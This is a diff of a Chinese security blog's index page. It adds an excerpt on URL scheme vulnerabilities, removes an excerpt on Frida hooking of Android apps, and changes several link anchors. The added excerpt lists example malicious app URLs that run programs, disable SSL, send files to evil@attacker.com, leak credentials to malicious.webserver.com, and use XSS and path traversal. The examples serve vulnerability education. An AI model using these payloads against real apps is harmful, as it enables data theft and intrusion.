@@ -296,6 +296,156 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://mabin004.github.io/2018/05/06/URL-Scheme安全漏洞案例/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="m4bln">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m4bln">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/05/06/URL-Scheme安全漏洞案例/" itemprop="url">URL Scheme安全漏洞案例</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-06T11:20:00+08:00">
+                2018-05-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/05/06/URL-Scheme安全漏洞案例/" class="leancloud_visitors" data-flag-title="URL Scheme安全漏洞案例">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+          
+URL Scheme可能存在的问题
+
+调起内部敏感组件或数据myapp://cmd/run?program=/path/to/program/to/run
+直接更改内部配置myapp://cmd/set_preference?use_ssl=false
+泄露内部敏感文件myapp://cmd/sendfile?to=evil@attacker.com&amp;file=some/data/file
+删除某些敏感文件myapp://cmd/delete?data_to_delete=my_document_ive_been_working_on
+泄露凭据信息myapp://cmd/login_to?server_to_send_credentials=malicious.webserver.com
+未过滤数据导致的xssmyapp://cmd/adduser=’&gt;”&gt;javascript to run goes here
+目录穿越myapp://use_template?template=/../../../../../../../../some/other/file
+
+
+
+
+          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/05/06/URL-Scheme安全漏洞案例/#espandi" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://mabin004.github.io/2018/04/28/Web调起APP研究/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -385,7 +535,7 @@ Android0x0 自定义schemeAndroid上常用的是通过scheme协议的方式唤�
           ...
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/04/28/Web调起APP研究/#more" rel="contents">
+            <a class="btn" href="/2018/04/28/Web调起APP研究/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -538,7 +688,7 @@ patch.sh的注释中写的很明确：123456789101112131415161718192021222324252
           ...
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/04/17/使用IPAPatch免越狱调试、修改第三方App/#more" rel="contents">
+            <a class="btn" href="/2018/04/17/使用IPAPatch免越狱调试、修改第三方App/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -686,7 +836,7 @@ Java代码在解压ZIP文件时会使用到ZipEntry类的getName()方法。如�
           ...
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/03/30/zip解压漏洞/#more" rel="contents">
+            <a class="btn" href="/2018/03/30/zip解压漏洞/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -824,7 +974,7 @@ strcat123456789101112没有控制好循环次数，导致strcat溢出for (i=0; i
           ...
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/03/23/经典漏洞案例整理/#more" rel="contents">
+            <a class="btn" href="/2018/03/23/经典漏洞案例整理/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -966,7 +1116,7 @@ For extracting HTTPS, FTP and other URL format use1grep -E &apos;(((https|ftp|go
           ...
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/03/22/常用的正则、搜索/#more" rel="contents">
+            <a class="btn" href="/2018/03/22/常用的正则、搜索/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1103,7 +1253,7 @@ For extracting HTTPS, FTP and other URL format use1grep -E &apos;(((https|ftp|go
           ...
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/03/17/蓝牙的发现、扫描/#more" rel="contents">
+            <a class="btn" href="/2018/03/17/蓝牙的发现、扫描/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1241,7 +1391,7 @@ For extracting HTTPS, FTP and other URL format use1grep -E &apos;(((https|ftp|go
           ...
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/03/15/文件后缀名枚举/#more" rel="contents">
+            <a class="btn" href="/2018/03/15/文件后缀名枚举/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1386,7 +1536,7 @@ Unocorn引擎是什么?
           ...
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/03/15/Unicorn使用/#more" rel="contents">
+            <a class="btn" href="/2018/03/15/Unicorn使用/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1532,173 +1682,7 @@ Unocorn引擎是什么?
           ...
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/03/13/使用lief对ELF文件Patch/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://mabin004.github.io/2018/03/09/droid-Hook-——-Frida/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="m4bln">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="m4bln">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/03/09/droid-Hook-——-Frida/" itemprop="url">Android Hook 之 Frida</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-09T16:22:02+08:00">
-                2018-03-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/03/09/droid-Hook-——-Frida/" class="leancloud_visitors" data-flag-title="Android Hook 之 Frida">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          Frida简介Frida是一款基于python + javascript 的hook框架，通杀android\ios\linux\win\osx等各平台，由于是基于脚本的交互，相比xposed和substrace cydia更加便捷，本文重点介绍Frida在android下面的使用。
-Frida的官网为：http://www.frida.re/
-环境配置
-pip install frida 安装frida环境
-在root的手机上运行frida server端
-wget https://build.frida.re/frida/android/arm/bin/frida-server
-adb push frida-server /data/lcoal/tmp
-chmod 755 frida-server
-./frida-server &amp;
-
-
-adb forward
-adb forward tcp:27042 tcp:27042
-adb forward tcp:27043 tcp:27043
-
-
-完成配置，直接在PC端运行hook脚本即可
-
-需要注意的是，frida的客户端和服务度版本应该相同，否则会出现不可预知的其他错误。1frida --version 查看版本
-免root实现frida hook（重打包）
-apktool反编译apk
-1$ apktool d test.apk -o test
-
-将对应版本的gadget拷贝到/lib没有了下.例如arm32的设备路径如下.
-
-
-/lib/armeabi/libfrida-gadget.so下载地址:https://github.com/frida/frida/releases/
-
-smali注入加载library,选择application类或者Activity入口.
-1const-string v0, &quot
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/03/09/droid-Hook-——-Frida/#more" rel="contents">
+            <a class="btn" href="/2018/03/13/使用lief对ELF文件Patch/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1786,7 +1770,7 @@ smali注入加载library,选择application类或者Activity入口.
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">77</span>
+                  <span class="site-state-item-count">78</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
